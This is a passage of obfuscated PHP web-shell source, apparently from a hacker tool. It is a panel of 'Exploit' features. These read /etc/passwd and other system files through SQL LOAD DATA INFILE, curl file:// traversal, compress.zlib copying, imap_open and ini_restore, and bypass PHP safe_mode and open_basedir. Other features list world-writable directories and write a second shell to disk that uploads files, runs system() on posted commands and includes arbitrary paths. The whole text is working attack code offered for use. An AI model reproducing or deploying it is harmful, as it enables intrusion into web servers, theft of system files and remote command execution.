'; return $sp9633f6; } } $spc48220->tableheader(); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: read file [SQL , id , CURL , copy , ini_restore , imap]    & Make file ERORR</b></td></tr></table>', 'center', 'top'); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file :</FONT><br>' . $spc48220->makeinput('Mohajer22', '/etc/passwd') . $spc48220->makeinput('', Show, 'Mohajer22', 'submit'))); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file id:</FONT><br>' . $spc48220->makeid('plugin', 'cat /etc/passwd') . $spc48220->makeinput('', Show, 'plugin', 'submit'))); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file CURL:</FONT><br>' . $spc48220->makeinput('curl', '/etc/passwd') . $spc48220->makeinput('', Show, 'curl', 'submit'))); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file copy:</FONT><br>' . $spc48220->makeinput('copy', '/etc/passwd') . $spc48220->makeinput('', Show, 'copy', 'submit'))); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file ini_restore:</FONT><br>' . $spc48220->makeinput('M2', '/etc/passwd') . $spc48220->makeinput('', Show, 'M2', 'submit'))); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>read file or dir with imap:</FONT><br>' . $spc48220->makeimp('switch', '/etc/passwd') . $spc48220->makeinput('string', '/etc/passwd') . $spc48220->makeinput('string', 'Show', '', 'submit'))); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>Make file ERORR:</FONT><br>' . $spc48220->makeinput('ER', 'Mohajer22.php') . $spc48220->makeinput('ER', 'Write', 'ER', 'submit'))); if (empty($_POST['Mohajer22'])) { } else { echo 'read file SQL', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp7ff75d = $_POST['Mohajer22']; $sp71d7d1 = '/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf'; $spf79e00 = explode(':', $sp71d7d1); $sp2f57d0 = array("USE {$sp5d4f2d}", 'CREATE TEMPORARY TABLE ' . ($sp1fff8b = 'A' . time()) . ' (a LONGBLOB)', "LOAD DATA LOCAL INFILE '{$sp7ff75d}' INTO TABLE {$sp1fff8b} FIELDS " . 'TERMINATED BY       \'__THIS_NEVER_HAPPENS__\' ' . 'ESCAPED BY          \'\' ' . 'LINES TERMINATED BY \'__THIS_NEVER_HAPPENS__\'', "SELECT a FROM {$sp1fff8b} LIMIT 1"); mysql_connect($sp8e0a6d, $spcdc189, $sp3e5b62); foreach ($sp2f57d0 as $sp67b747) { $sp223e0a = mysql_query($sp67b747); if ($sp223e0a == false) { die('FAILED: ' . $sp67b747 . '
' . 'REASON: ' . mysql_error() . '
'); } if (!($sp305b9c = @mysql_fetch_array($sp223e0a, MYSQL_NUM))) { continue; } echo htmlspecialchars($sp305b9c[0]); mysql_free_result($sp223e0a); } echo '</textarea>'; } if (empty($_POST['ER'])) { } else { $sp76804b = $_POST['ER']; echo error_log('
<html>
<head>
<title> Exploit: error_log() By * erne   * </title>
<body bgcolor="#000000">
<table Width=\'100%\' height=\'10%\' bgcolor=\'#D0D0D0\' border=\'1\'>
<tr>
<td><center><font size=\'6\' color=\'#BBB516\'> By  erne </font></center></td>
</tr>
</table>
<font color=\'#9C9C9C\'>
</head>
<?
if($fileup == ""){
ECHO " reade for up ";
}else{
$path= exec("pwd");
$path .= "/$fileup_name";
$CopyFile = copy($fileup,"$path");
if($CopyFile){
echo " up ok ";
}else{
echo " no up ";
}
}
if(empty($_POST[\'m\'])){
} else {
$m=$_POST[\'m\'];
echo  system($m);
}
if(empty($_POST[\'cmd\'])){
} else {
$h=  $_POST[\'cmd\'];
 print include($h) ;
}
?>
<form method=\'POST\' enctype=\'multipart/form-data\' >
<input type=\'file\' name=\'fileup\' size=\'20\'>
<input type=\'submit\' value=\'  up  \'>
</form>
<form method=\'POST\'  >
<input type=\'cmd\' name=\'cmd\' size=\'20\'>
<input type=\'submit\' value=\'  open (shill.txt) \'>
</form>
<form method=\'POST\' enctype=\'multipart/form-data\' >
<input type=\'text\' name=\'m\' size=\'20\'>
<input type=\'submit\' value=\'  run  \'>
<input type=\'reset\' value=\' reset \'>
</form>
', 3, $sp76804b); } if ($_POST['plugin']) { echo 'read file id', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; for ($sped417e = 0; $sped417e < 60000; $sped417e++) { $spc7f0ae = posix_getpwuid($sped417e); if (!empty($spc7f0ae)) { while (list($sp7ac89e, $spa59682) = each($spc7f0ae)) { print "{$spa59682}:"; } print '
'; } } echo '</textarea>'; } if (empty($_POST['curl'])) { } else { echo 'read file CURL', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp8374c6 = $_POST['curl']; $sp8cb9f2 = curl_init('file:///' . $sp8374c6 . ' /../../../../../../../../../../../../' . __FILE__); curl_exec($sp8cb9f2); var_dump(curl_exec($sp8cb9f2)); echo '</textarea>'; } $spe77d2a = ''; $spcaca7a = ''; if (empty($_POST['copy'])) { } else { echo 'read file copy', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $spe77d2a = $_POST['copy']; $spc44fb2 = tempnam($spcaca7a, 'cx'); if (copy('compress.zlib://' . $spe77d2a, $spc44fb2)) { $spb2fae3 = fopen($spc44fb2, 'r'); $sp40a871 = fread($spb2fae3, filesize($spc44fb2)); fclose($spb2fae3); echo '' . htmlspecialchars($sp40a871) . ''; unlink($spc44fb2); echo '</textarea>'; } else { die('<FONT COLOR="RED"><CENTER>Sorry... File
<B>' . htmlspecialchars($spe77d2a) . '</B> dosen\'t exists or you don\'t have
access.</CENTER></FONT>'); } } echo '[syslog]08
'; if (empty($_POST['M2'])) { } else { echo 'read file ini_restore', '<br> '; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp8374c6 = $_POST['M2']; echo ini_get('safe_mode'); echo ini_get('open_basedir'); $sp1acd5c = readfile("{$sp8374c6}"); ini_restore('safe_mode'); ini_restore('open_basedir'); echo ini_get('safe_mode'); echo ini_get('open_basedir'); $sp1acd5c = readfile("{$sp8374c6}"); echo '</textarea>'; } $sp54f89f = !empty($_POST['string']) ? $_POST['string'] : 0; $sp01de99 = !empty($_POST['switch']) ? $_POST['switch'] : 0; if ($sp54f89f && $sp01de99 == 'file') { echo 'read file imap', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp09a55b = imap_open($sp54f89f, '', ''); $sp1ae2ba = imap_body($sp09a55b, 1); if (!empty($sp1ae2ba)) { echo '<pre>' . $sp1ae2ba . '</pre>'; } imap_close($sp09a55b); echo '</textarea>'; } elseif ($sp54f89f && $sp01de99 == 'dir') { echo 'read  dir imap', '<br>'; echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp09a55b = imap_open('/etc/passwd', '', ''); if ($sp09a55b == FALSE) { die('Can\'t open imap stream'); } $sp54f89f = explode('|', $sp54f89f); if (count($sp54f89f) > 1) { $spacc564 = imap_list($sp09a55b, trim($sp54f89f[0]), trim($sp54f89f[1])); } else { $spacc564 = imap_list($sp09a55b, trim($sp54f89f[0]), '*'); } echo '<pre>'; for ($sp412bbc = 0; $sp412bbc < count($spacc564); $sp412bbc++) { echo "{$spacc564[$sp412bbc]}" . '<p>&nbsp;</p>'; } echo '</pre>'; imap_close($sp09a55b); echo '</textarea>'; } $spc48220->tdbody('</td></tr></table>'); $spc48220->tableheader(); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: Open dir </b></td></tr></table>', 'center', 'top'); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); if (empty($_POST['m'])) { echo "<div><FORM method='POST' action='{$sp10841a}' enctype='multipart/form-data'>\n<table id=tb><tr><td><FONT COLOR=\"#9B9B9B\">path dir</FONT>\n<INPUT type='text' name='m' size=70 value='./'>\n<INPUT type='submit' value='show' id=input></td></tr></table></form></div>"; } else { $sp8374c6 = $_POST['m']; $sp1169fe = $sp8374c6; $sp149c6d = $sp8374c6; $spc4b181 = intval(trim($_POST['method'])); $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($sp7ff75d = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$sp7ff75d}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0777') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $sp7ff75d; $sp412bbc++; } } } closedir($sp8975da); clearstatcache(); echo '<strong><FONT COLOR=#9B9B9B>The folders is 777 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0755') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 755 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0644') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 644 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0750') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 750 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0604') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 604 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0705') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 705 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0606') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 606 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); if (is_dir($sp292e28) && $spce0b8c == '0703') { if (!file_exists('.*')) { $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } } } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>The folders is 703 :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } } $sp8975da = opendir($sp149c6d); $sp669faa = array(); $sp412bbc = 0; while (false !== ($spfc2aa9 = readdir($sp8975da))) { $sp292e28 = "{$sp149c6d}/{$spfc2aa9}"; $spce0b8c = substr(sprintf('%o', fileperms($sp292e28)), -4); $sp669faa[$sp412bbc] = $spfc2aa9; $sp412bbc++; } clearstatcache(); echo '</FONT><strong><FONT COLOR=#9B9B9B>www.alturks.com :</strong><br />'; foreach ($sp669faa as $sp51d7c4) { echo $sp51d7c4 . '<br />'; } echo '</FONT><strong><FONT COLOR=#9C9C9C>ernealizm: </strong>' . $sp412bbc . '</FONT><br />'; $spc48220->tdbody('</td></tr></table>'); $spc48220->tableheader(); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: break fucking safe-mode </b></td></tr></table>', 'center', 'top'); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); error_reporting(E_WARNING); ini_set('display_errors', 1); echo '<head><title>' . getcwd() . '</title></head>'; echo '<form method=POST>'; echo "<div style='float: left'><FONT COLOR=\"#9B9B9B\">Root directory: </FONT><input type=text name=root value='{$_POST['root']}'></div>"; echo '<input type=submit value=\'--&raquo;\'></form>'; $spb13e10 = '/'; if ($_POST['root']) { $spb13e10 = $_POST['root']; } if (!ini_get('safe_mode')) { die('<font size=-2 face=verdana color=\'#9B9B9B\'>Safe-mode is OFF.</font>'); } echo '<textarea method=\'POST\' cols=\'95\' rows=\'30\' wrar=\'off\' >'; $sp559d1c = 0; $sp274cf2 = array(); set_error_handler('eh'); $spbad5a0 = '_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; for ($sp412bbc = 0; $sp412bbc < strlen($spbad5a0); $sp412bbc++) { $sp149c6d = "{$spb13e10}" . (substr($spb13e10, -1) != '/' ? '/' : NULL) . "{$spbad5a0[$sp412bbc]}"; $sp7a1022 = $sp274cf2[count($sp274cf2) - 1]; glob($sp149c6d . '*'); if ($sp274cf2[count($sp274cf2) - 1] != $sp7a1022) { for ($sp460372 = 0; $sp460372 < strlen($spbad5a0); $sp460372++) { $sp149c6d = "{$spb13e10}" . (substr($spb13e10, -1) != '/' ? '/' : NULL) . "{$spbad5a0[$sp412bbc]}{$spbad5a0[$sp460372]}"; $sp139df0 = $sp274cf2[count($sp274cf2) - 1]; glob($sp149c6d . '*'); if ($sp274cf2[count($sp274cf2) - 1] != $sp139df0) { for ($spba2fc0 = 0; $spba2fc0 < strlen($spbad5a0); $spba2fc0++) { $sp149c6d = "{$spb13e10}" . (substr($spb13e10, -1) != '/' ? '/' : NULL) . "{$spbad5a0[$sp412bbc]}{$spbad5a0[$sp460372]}{$spbad5a0[$spba2fc0]}"; $spaa1b81 = $sp274cf2[count($sp274cf2) - 1]; glob($sp149c6d . '*'); if ($sp274cf2[count($sp274cf2) - 1] != $spaa1b81) { for ($sp305b9c = 0; $sp305b9c < strlen($spbad5a0); $sp305b9c++) { $sp149c6d = "{$spb13e10}" . (substr($spb13e10, -1) != '/' ? '/' : NULL) . "{$spbad5a0[$sp412bbc]}{$spbad5a0[$sp460372]}{$spbad5a0[$spba2fc0]}{$spbad5a0[$sp305b9c]}"; glob($sp149c6d . '*'); } } } } } } } $sp274cf2 = array_unique($sp274cf2); foreach ($sp274cf2 as $sp527681) { echo "{$sp527681}\n"; } function eh($specf052, $sp271e5b, $spf6a5a8, $sp95693f) { echo '[syslog]09_f
'; global $sp274cf2, $sp559d1c, $sp412bbc; preg_match('/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is(.*)is\\ not\\ allowed\\ to\\ access(.*)owned by uid(.*)/', $sp271e5b, $sp04932d); if ($sp04932d) { $sp274cf2[$sp559d1c] = $sp04932d[2]; $sp559d1c++; } } echo '</textarea>'; $spc48220->tdbody('</td></tr></table>'); echo '[syslog]010
';